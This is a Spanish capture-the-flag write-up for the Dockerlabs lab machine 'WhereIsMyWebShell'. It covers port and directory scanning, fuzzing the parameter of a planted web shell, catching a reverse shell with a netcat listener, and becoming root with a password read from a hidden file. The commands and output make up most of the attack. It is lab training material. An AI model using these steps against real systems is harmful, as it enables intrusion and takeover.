---
layout: post
title: WhereIsMyWebShell
subtitle: Plataforma Dockerlabs Dificultad Fácil
cover-img: /assets/img/Whereismywebshell.png
thumbnail-img: /assets/img/Whereismywebshell.png
share-img: /assets/img/Whereismywebshell.png
author: Elmili72
---

![image](https://github.com/user-attachments/assets/99f82ba6-45dc-4349-8ff8-72a9191d94a5)

## 1. Escaneo general de puertos

Primero como siempre realizamos un escaneo general de los puertos para ver que puertos están abiertos.

```bash
sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## 2. Escaneo específico de puertos

Una vez sabemos que puertos estan abiertos tenemos que ver que servicios y en que versión corren en esos puertos. En este caso el puerto 80(HTTP)

```bash
nmap -sCV -p80 172.17.0.2 -oN target
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## 3. Reconocimiento del servicio web

Al entrar en la página aparece un índice que varios elementos sin importancia, exceptuando la parte de abajo de la páginas que nos deja un mensaje interesante.

![image](https://github.com/user-attachments/assets/5a27e707-f2d9-4c49-9d38-c1ee157ff1cb)

## 4. Escaneo de directorios del servicio web

Al no haber más información útil tenemos que pasar al escaneo de directorios de la página en cuestión y nos aparecen dos archivos que nos son de gran ayuda.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,js,css,txt

/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
```

Nos dice que la web ha sido atacada y que un hacker anterior dejó alojada una webshell alojada. Aunque, no conocemos el parámetro en cuestión podemos realizar *FUZZING* con *WFUZZ* para descubrir que parámetro es el correto para poder utilizarla.

![image](https://github.com/user-attachments/assets/dca111ac-29a4-4837-9841-e327cfd410d6)

```bash
wfuzz -c --hc 404 --hl 0 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://172.17.0.2/shell.php?FUZZ=id
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================
000115401:   200        2 L      4 W        66 Ch       "parameter"
```

## 5. Explotación e Intrusión

Una vez tenemos nuestro parámetro para la webshell, toca comprobar que funciona correctamente y vemos que ejecuta comandos sin problemas, por lo que podemos ejecutarnos una revshell para realizar nuestra intrusión.

![image](https://github.com/user-attachments/assets/1acafc69-cb80-4355-b8f8-4fcc599c7374)

![image](https://github.com/user-attachments/assets/ee23fad4-46e6-4e9b-9ba6-876534a2c969)

```bash
c -nlvp 4444                       
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39546
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@9807d124f667:/var/www/html$ whoami
whoami
www-data
www-data@9807d124f667:/var/www/html$
```

Toca recordar lo que ponía en el servicio web y estar atentos al directorio */tmp*. Vemos un archivo .secret.txt.

```bash
www-data@9807d124f667:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root 4096 May 18 11:56 .
drwxr-xr-x 1 root root 4096 May 18 11:56 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
```

## 6. Escalada de privilegios

Y en esta máquina la escalada es tal que así, leemos el archivo .secret.txt, el cual contiene la contraseña de root e iniciamos sin problemas como root.

```bash
www-data@9807d124f667:/tmp$ cat .secret.txt
contraseñaderoot123
www-data@9807d124f667:/tmp$ su root
Password: 
root@9807d124f667:/tmp# whoami
root
```

¡Espero que os haya gustado y os haya servido de ayuda! ¡Hasta el próximo writeup!
